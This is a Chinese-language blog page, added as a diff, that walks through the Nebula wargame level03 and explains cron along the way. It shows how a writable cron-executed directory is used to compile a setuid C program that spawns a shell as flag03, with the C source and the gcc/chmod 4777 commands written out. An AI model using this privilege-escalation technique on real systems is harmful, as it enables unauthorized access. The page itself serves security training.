@@ -1,0 +1,340 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+    <meta name="Keywords" content="blog"/>
+    <meta name="Description" content="blog"/>
+    <title>Mr.Hot</title>
+    <link rel="shortcut icon" href="/static/favicon.png"/>
+    <link rel="stylesheet" type="text/css" href="/main.css" />
+</head>
+<body>
+<div class="main">
+    <div class="header">
+    	<ul id="pages">
+            <li><a href="/">home</a></li>
+            <li><a href="/#/tags">tags</a></li>
+            <li><a href="/#/archive">archive</a></li>
+    	</ul>
+    </div>
+	<div class="wrap-header">
+	<h1>
+    <a href="/" id="title"></a>
+	</h1>
+	</div>
+<div id="md" style="display: none;">
+<!-- markdown -->
+##Level03关卡介绍：
+这一关的关卡说明告诉我们，有一个crontab会每隔几分钟被调用一次。这次的目标没有明确说明，那我们还是把它定为拿到flag03的shell好了。
+少年，是时候展现你真正的实力了。
+
+使用level03的账号登陆系统（密码也是level03）
+
+相关文件可以在/home/flag03中找到。
+
+[关卡原址](https://exploit-exercises.com/nebula/level03/)
+
+
+
+##什么是crontab？
+在理解crontab之前，我们需要先来了解下什么是[Cron](https://en.wikipedia.org/wiki/Cron)。
+
+Cron来源于希腊语 chronos(χρόνος)，原意是时间。也可理解为Command Run Over Night的缩写。
+
+Cron能够通过守护进程去执行各种任务（命令，shell脚本等）。而Cron是通过一个名为crontab的文件来驱动，crontab中存放了需要被执行的各种任务。
+
+系统的crontab文件位置:/etc/crontab。
+
+而为了管理不同用户的Cron任务，linux提供了名为crontab的命令来方便的修改相应的crontab文件。
+
+
+##先看看flag03下有什么东西吧
+值得注意的是writable.d文件夹对于我们而言是有写入权限的。
+![Alt text](http://i76.photobucket.com/albums/j22/Jo_Yunix/Nebula_level03_1_zpsezgy87ik.png)
+
+再看下writable.sh的内容吧：
+~~~~{bash}
+#!/bin/sh
+
+for i in /home/flag03/writable.d/* ; do #循环获取writable.d中的文件
+    #限制最大CPU执行时间为5秒，执行当前循环到的文件
+    (ulimit -t 5; bash -x "$i")
+    #删除当前文件
+    rm -f "$i"
+done
+}~~~~
+
+
+参考：
+[通过 ulimit 改善系统性能](http://www.ibm.com/developerworks/cn/linux/l-cn-ulimit/)
+
+##如何证明writable.sh就是每隔几分钟被调用的程序呢
+很简单，只要往writable.d文件夹中写入任意文件，看看过一段时间是否会被删除即可。
+
+
+##线索收集
+* 线索1：writable.sh每隔几分钟会被被调用一次
+* 线索2：writable.sh会用bash来执行writable.d中的文件
+* 线索3：writable.d文件夹可写入
+* 线索4：writable.d中的每个文件执行的时间限制为5秒
+
+
+##庖丁解牛
+通过分析上面的线索，我们可以通过在writable.d文件夹下构造bash脚本来以flag03的身份（因为该Crontab对应的用户是flag03）运行任何程序，
+
+因为限制了CPU时间，所以想使用netcat等工具就不行了。
+那如何得到shell呢，这个可以联想一下前两个关卡的内容。
+
+
+本来想先随便搞个4777权限的文件，然后再修改它，结果用level03的账号修改了后就`丢失`setuid的权限了。
+
+因为c文件写起来比较麻烦，尝试用python构造了一个类似的文件结果运行id发现还是level03。
+~~~~{python}
+#!/usr/bin/python
+import os
+res = os.getresuid()#结果resuid的值是都是level03的id
+eid = res[1]
+os.setresuid(eid, eid, eid)
+os.system("/bin/sh")
+~~~~
+
+原因应该是实际调用的python解释器，而python文件是作为文本传递给python解释器的，所以说给python文件设置suid位是没有意义的。
+
+尝试了下发现有gcc，那就可以编译文件了。
+先在/tmp下构造一个名为c.c的文件，内容如下：
+
+~~~~{c}
+#include <unistd.h>
+#include <sys/types.h>
+main()
+{
+     gid_t gid;     
+     uid_t uid;     
+     gid = getegid();     //get the effective group ID of the calling process
+     uid = geteuid();
+     setresgid(gid, gid, gid);     //set the real user ID, the effective user ID, and the saved set-user-ID
+     setresuid(uid, uid, uid);
+     system("/usr/bin/env sh”);
+}
+~~~~
+
+然后我们编写编译脚本，并为输出其加上4777的权限，命令如下:
+~~~~{bash}
+gcc -o /tmp/out /tmp/c.c&&chmod 4777 /tmp/out
+mv /tmp/out ~/
+~~~~
+
+*注意*这里最后将out文件移动到/home/flag03下面很重要，之前在`/tmp`文件夹下无论如何都没法成功。原因是`/tmp`挂载的时候使用了`nosuid`的选项。
+
+参考：[SUID-bit not working for executables within /tmp directory](http://unix.stackexchange.com/questions/157314/suid-bit-not-working-for-executables-within-tmp-directory)
+
+##见证奇迹的时刻到了
+在/home/flag03下运行一下out文件。
+
+![Alt text](http://i76.photobucket.com/albums/j22/Jo_Yunix/Nebula_level03_2_zpsce4wb2k4.png)
+
+成功获得flag03的shell，接下去想执行什么命令就随意咯~
+
+<!-- markdown end -->
+</div>
+<div class="entry" id="main">
+<!-- content -->
+<h2 id="level03">Level03关卡介绍：</h2>
+
+<p>这一关的关卡说明告诉我们，有一个crontab会每隔几分钟被调用一次。这次的目标没有明确说明，那我们还是把它定为拿到flag03的shell好了。
+少年，是时候展现你真正的实力了。</p>
+
+<p>使用level03的账号登陆系统（密码也是level03）</p>
+
+<p>相关文件可以在/home/flag03中找到。</p>
+
+<p><a href="https://exploit-exercises.com/nebula/level03/">关卡原址</a></p>
+
+<h2 id="crontab">什么是crontab？</h2>
+
+<p>在理解crontab之前，我们需要先来了解下什么是<a href="https://en.wikipedia.org/wiki/Cron">Cron</a>。</p>
+
+<p>Cron来源于希腊语 chronos(χρόνος)，原意是时间。也可理解为Command Run Over Night的缩写。</p>
+
+<p>Cron能够通过守护进程去执行各种任务（命令，shell脚本等）。而Cron是通过一个名为crontab的文件来驱动，crontab中存放了需要被执行的各种任务。</p>
+
+<p>系统的crontab文件位置:/etc/crontab。</p>
+
+<p>而为了管理不同用户的Cron任务，linux提供了名为crontab的命令来方便的修改相应的crontab文件。</p>
+
+<h2 id="flag03">先看看flag03下有什么东西吧</h2>
+
+<p>值得注意的是writable.d文件夹对于我们而言是有写入权限的。
+<img src="http://i76.photobucket.com/albums/j22/Jo_Yunix/Nebula_level03_1_zpsezgy87ik.png" alt="Alt text" title=""></p>
+
+<p>再看下writable.sh的内容吧：</p>
+
+<pre class=" language-bash"><code class=" language-bash"><span class="token important">#!/bin/sh</span>
+
+<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token operator">/</span>home<span class="token operator">/</span>flag03<span class="token operator">/</span>writable<span class="token punctuation">.</span>d<span class="token operator">/</span><span class="token operator">*</span> <span class="token punctuation">;</span> <span class="token keyword">do</span> <span class="token comment" spellcheck="true">#循环获取writable.d中的文件
+</span>    <span class="token comment" spellcheck="true">#限制最大CPU执行时间为5秒，执行当前循环到的文件
+</span>    <span class="token punctuation">(</span>ulimit <span class="token operator">-</span>t <span class="token number">5</span><span class="token punctuation">;</span> bash <span class="token operator">-</span>x <span class="token string">"<span class="token property">$i</span>"</span><span class="token punctuation">)</span>
+    <span class="token comment" spellcheck="true">#删除当前文件
+</span>    rm <span class="token operator">-</span>f <span class="token string">"<span class="token property">$i</span>"</span>
+<span class="token keyword">done</span>
+<span class="token punctuation">}</span></code></pre>
+
+<p>参考：
+<a href="http://www.ibm.com/developerworks/cn/linux/l-cn-ulimit/">通过 ulimit 改善系统性能</a></p>
+
+<h2 id="writablesh">如何证明writable.sh就是每隔几分钟被调用的程序呢</h2>
+
+<p>很简单，只要往writable.d文件夹中写入任意文件，看看过一段时间是否会被删除即可。</p>
+
+<h2 id="">线索收集</h2>
+
+<ul>
+<li>线索1：writable.sh每隔几分钟会被被调用一次</li>
+<li>线索2：writable.sh会用bash来执行writable.d中的文件</li>
+<li>线索3：writable.d文件夹可写入</li>
+<li>线索4：writable.d中的每个文件执行的时间限制为5秒</li>
+</ul>
+
+<h2 id="">庖丁解牛</h2>
+
+<p>通过分析上面的线索，我们可以通过在writable.d文件夹下构造bash脚本来以flag03的身份（因为该Crontab对应的用户是flag03）运行任何程序，</p>
+
+<p>因为限制了CPU时间，所以想使用netcat等工具就不行了。
+那如何得到shell呢，这个可以联想一下前两个关卡的内容。</p>
+
+<p>本来想先随便搞个4777权限的文件，然后再修改它，结果用level03的账号修改了后就<code>丢失</code>setuid的权限了。</p>
+
+<p>因为c文件写起来比较麻烦，尝试用python构造了一个类似的文件结果运行id发现还是level03。</p>
+
+<pre class=" language-python"><code class=" language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python
+</span><span class="token keyword">import</span> os
+res <span class="token operator">=</span> os<span class="token punctuation">.</span>getresuid<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#结果resuid的值是都是level03的id
+</span>eid <span class="token operator">=</span> res<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
+os<span class="token punctuation">.</span>setresuid<span class="token punctuation">(</span>eid<span class="token punctuation">,</span> eid<span class="token punctuation">,</span> eid<span class="token punctuation">)</span>
+os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span>
+</code></pre>
+
+<p>原因应该是实际调用的python解释器，而python文件是作为文本传递给python解释器的，所以说给python文件设置suid位是没有意义的。</p>
+
+<p>尝试了下发现有gcc，那就可以编译文件了。
+先在/tmp下构造一个名为c.c的文件，内容如下：</p>
+
+<pre class=" language-c"><code class=" language-c"><span class="token property">#include <span class="token property">&lt;unistd.h&gt;</span></span>
+<span class="token property">#include &lt;sys/types.h&gt;</span>
+<span class="token function">main<span class="token punctuation">(</span></span><span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+     gid_t gid<span class="token punctuation">;</span>     
+     uid_t uid<span class="token punctuation">;</span>     
+     gid <span class="token operator">=</span> <span class="token function">getegid<span class="token punctuation">(</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true"> //get the effective group ID of the calling process
+</span>     uid <span class="token operator">=</span> <span class="token function">geteuid<span class="token punctuation">(</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+     <span class="token function">setresgid<span class="token punctuation">(</span></span>gid<span class="token punctuation">,</span> gid<span class="token punctuation">,</span> gid<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true"> //set the real user ID, the effective user ID, and the saved set-user-ID
+</span>     <span class="token function">setresuid<span class="token punctuation">(</span></span>uid<span class="token punctuation">,</span> uid<span class="token punctuation">,</span> uid<span class="token punctuation">)</span><span class="token punctuation">;</span>
+     <span class="token function">system<span class="token punctuation">(</span></span>"<span class="token operator">/</span>usr<span class="token operator">/</span>bin<span class="token operator">/</span>env sh”<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+</code></pre>
+
+<p>然后我们编写编译脚本，并为输出其加上4777的权限，命令如下:</p>
+
+<pre class=" language-bash"><code class=" language-bash">gcc <span class="token operator">-</span>o <span class="token operator">/</span>tmp<span class="token operator">/</span>out <span class="token operator">/</span>tmp<span class="token operator">/</span>c<span class="token punctuation">.</span>c<span class="token operator">&amp;&amp;</span>chmod <span class="token number">4777</span> <span class="token operator">/</span>tmp<span class="token operator">/</span>out
+mv <span class="token operator">/</span>tmp<span class="token operator">/</span>out <span class="token operator">~</span><span class="token operator">/</span>
+</code></pre>
+
+<p><em>注意</em>这里最后将out文件移动到/home/flag03下面很重要，之前在<code>/tmp</code>文件夹下无论如何都没法成功。原因是<code>/tmp</code>挂载的时候使用了<code>nosuid</code>的选项。</p>
+
+<p>参考：<a href="http://unix.stackexchange.com/questions/157314/suid-bit-not-working-for-executables-within-tmp-directory">SUID-bit not working for executables within /tmp directory</a></p>
+
+<h2 id="">见证奇迹的时刻到了</h2>
+
+<p>在/home/flag03下运行一下out文件。</p>
+
+<p><img src="http://i76.photobucket.com/albums/j22/Jo_Yunix/Nebula_level03_2_zpsce4wb2k4.png" alt="Alt text" title=""></p>
+
+<p>成功获得flag03的shell，接下去想执行什么命令就随意咯~</p>
+<!-- content end -->
+</div>
+<br>
+<br>
+    <div id="disqus_thread"></div>
+	<div class="footer">
+		<p>↖(▔＾▔)↗</p>
+	</div>
+<!-- duoshuo -->
+<div class="ds-thread" data-thread-key="dOZWJ1bGLbGV2ZWwwMw==" data-title="单刷Nebula之level03" data-url=hot.github.io"dOZWJ1bGLbGV2ZWwwMw==.html"></div>
+<!-- duoshuo end -->
+	<!-- 多说公共JS代码 start (一个网页只需插入一次) -->
+<script type="text/javascript">
+var duoshuoQuery = {short_name:"hotgithub"};
+	(function() {
+		var ds = document.createElement('script');
+		ds.type = 'text/javascript';ds.async = true;
+		ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+		ds.charset = 'UTF-8';
+		(document.getElementsByTagName('head')[0] 
+		 || document.getElementsByTagName('body')[0]).appendChild(ds);
+	})();
+	</script>
+<!-- 多说公共JS代码 end -->
+</div>
+<script src="../main.js"></script>
+<script src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({tex2jax: {inlineMath: [['$','$'], ["\\(", "\\)"]], processEscapes: true}});
+</script>
+<script id="content" type="text/mustache">
+    <h1>{{title}}</h1>
+    <div class="tag">
+    {{date}}
+    {{#tags}}
+    <a href="/#/tag/{{name}}">#{{name}}</a>
+    {{/tags}}
+    </div>
+</script>
+<script id="pagesTemplate" type="text/mustache">
+    {{#pages}}
+    <li>
+        <a href="{{path}}">{{title}}</a>
+    </li>
+    {{/pages}}
+</script>
+<script>
+$(document).ready(function() {
+    $.ajax({
+        url: "../main.json",
+        type: "GET",
+        dataType: "json",
+        success: function(data) {
+            $("#title").html(data.name);
+            var pagesTemplate = Hogan.compile($("#pagesTemplate").html());
+            var pagesHtml = pagesTemplate.render({"pages": data.pages});
+            $("#pages").append(pagesHtml);
+            //path
+            var path = "dOZWJ1bGLbGV2ZWwwMw==.html";
+            //path end
+            var now = 0;
+            for (var i = 0; i < data.posts.length; ++i)
+                if (path == data.posts[i].path)
+                    now = i;
+            var post = data.posts[now];
+            var tmp = post.tags.split(" ");
+            var tags = [];
+            for (var i = 0; i < tmp.length; ++i)
+                if (tmp[i].length > 0)
+                    tags.push({"name": tmp[i]});
+            var contentTemplate = Hogan.compile($("#content").html());
+            var contentHtml = contentTemplate.render({"title": post.title, "tags": tags, "date": post.date});
+            $("#main").prepend(contentHtml);
+            if (data.disqus_shortname.length > 0) {
+                var disqus_shortname = data.disqus_shortname;
+                (function() {
+                    var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+                    dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+                    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+                })();
+            }
+        }
+    });
+});
+</script>
+</body>
+</html>
